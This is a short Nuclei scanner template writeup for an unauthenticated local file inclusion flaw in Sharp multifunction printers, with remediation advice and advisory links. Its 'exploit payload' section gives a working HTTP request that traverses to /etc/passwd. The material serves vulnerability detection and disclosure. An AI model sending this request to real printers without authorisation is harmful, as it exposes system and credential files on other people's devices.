# Nuclei Template: Sharp Multifunction Printers - Local File Inclusion
**Template ID:** sharp-printers-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`sharp-printers-lfi.yaml`)

## Vulnerability Information & PoC

## Description
It was observed that Sharp printers are vulnerable to a local file inclusion without authentication. Any attacker can read any file located in the printer.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/installed_emanual_down.html?path=/manual/../../../etc/passwd
```

## Remediation
Apply all relevant security patches and product upgrades.

## References
- https://pierrekim.github.io/blog/2024-06-27-sharp-mfp-17-vulnerabilities.html#pre-auth-lfi
- https://jvn.jp/en/vu/JVNVU93051062/index.html
- https://global.sharp/products/copier/info/info_security_2024-05.html
